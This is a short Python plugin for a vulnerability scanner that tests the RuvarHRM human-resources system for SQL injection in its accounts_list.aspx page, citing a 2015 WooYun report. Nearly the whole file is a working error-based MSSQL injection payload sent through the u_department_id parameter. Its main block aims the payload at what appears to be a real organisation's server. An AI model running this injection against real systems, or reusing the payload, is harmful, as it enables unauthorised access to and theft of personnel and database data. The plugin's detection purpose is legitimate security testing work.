#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 'RuvarHRM 人力资源管理系统 /RuvarHRM/admin/accounts_list.aspx SQL注入'
#references = 'http://wooyun.org/bugs/wooyun-2015-0159048'



def assign(service, arg):
    if service == "ruvarhrm":
        return True, arg

def audit(arg):
    target = arg+"RuvarHRM/admin/accounts_list.aspx?u_department_id=1%27and%201%3Dconvert%28int%2C%28char%2871%29%2bchar%2865%29%2bchar%2879%29%2bchar%2832%29%2bchar%2874%29%2bchar%2873%29%2bchar%2864%29%2b@@version%20%29%29--"
    code, head,res, errcode, _   = curl.curl2(target)
    if  'GAO JI@Microsoft SQL Server' in res:
        security_hole(target)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('ruvarhrm', 'http://oa.hnlxbus.com:8081/')[1])